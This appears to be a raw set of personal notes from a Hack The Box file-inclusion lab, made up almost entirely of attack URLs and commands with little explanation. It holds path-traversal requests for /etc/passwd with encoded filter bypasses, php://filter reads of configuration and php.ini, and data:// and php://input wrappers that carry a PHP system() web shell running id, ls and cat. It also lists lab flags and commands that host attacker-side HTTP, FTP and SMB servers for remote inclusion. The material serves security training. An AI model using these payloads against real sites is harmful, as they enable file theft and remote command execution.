http://94.237.49.166:56586/index.php?language=../../../../etc/passwd
barry

http://94.237.49.166:56586/index.php?language=../../../../usr/share/flags/flag.txt
HTB{n3v3r_tru$t_u$3r_!nput}

languages//....//....//....//....//....//etc/passwd
http://83.136.255.150:55558/index.php?language=%6c%61%6e%67%75%61%67%65%73%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64

languages//....//....//....//....//....//flag.txt
http://83.136.255.150:55558/index.php?language=%6c%61%6e%67%75%61%67%65%73%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%66%6c%61%67%2e%74%78%74

HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}

fuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.253.251:45849/FUZZ.php
en                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 275ms]
es                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 275ms]
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 276ms]

http://83.136.253.251:45849/index.php?language=php://filter/read=convert.base64-encode/resource=configure

echo "hash" | base64 -d #decrypt
HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}

php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"


echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

http://94.237.62.195:45255/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

curl -s -X POST --data '<?php system($_GET["c-m-d"]); ?>' "http://94.237.62.195:45255/index.php?language=php://input&cmd=id" | grep uid

echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

http://94.237.62.195:45255/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls /
http://94.237.62.195:45255/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt

HTB{d!$46l3_r3m0t3_url_!nclud3}

echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_includ

echo "<php? system($_GET['']); ?>"

sudo python3 -m http.server <LISTENING_PORT>
sudo python -m pyftpdlib -p 21
impacket-smbserver -smb2support share $(pwd)